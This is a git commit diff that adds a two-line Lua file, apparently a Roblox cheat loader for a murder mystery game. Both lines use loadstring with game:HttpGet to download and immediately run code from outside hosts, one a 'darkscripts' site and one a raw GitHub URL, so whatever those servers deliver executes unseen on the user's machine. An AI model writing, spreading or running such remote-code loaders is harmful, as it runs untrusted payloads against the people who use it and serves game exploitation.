8540b509791d61971d1dee73493a3cbd5a528ab1
azurkxo <140209544+azurkxo@users.noreply.github.com>
2024-12-29 21:52:18 +0200

    Add files via upload

---
+++ MurderMysteryScript.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet('https://darkscripts.space/scripts/a41ff9d7-2d59-4af4-89e9-77babaeff7b9_955955188068409386.lua',true))()                              
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))() 
